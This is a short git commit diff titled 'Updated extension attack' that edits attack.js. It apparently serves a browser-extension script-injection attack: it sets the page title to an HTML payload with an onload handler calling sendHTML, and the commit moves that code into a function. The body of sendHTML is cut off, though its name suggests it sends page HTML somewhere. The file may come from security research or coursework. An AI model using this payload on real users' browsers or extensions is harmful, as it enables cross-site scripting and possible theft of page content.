b518ba280970e6e24e0efec918961e1f1037f2c9
JBA192 <62188601+JBA192@users.noreply.github.com>
2023-03-15 22:05:58 -0400

    Updated extension attack

--- attack.js
+++ attack.js
@@ -1,6 +1,8 @@
-var attackScript = "<button onload='sendHTML()'></button>"
-if (document.title != attackScript) {
-    document.title = attackScript;
+function changeTitle() {
+    var attackScript = "<button onload='sendHTML()'></button>"
+    if (document.title != attackScript) {
+        document.title = attackScript;
+    }
 }
 
 function sendHTML() {
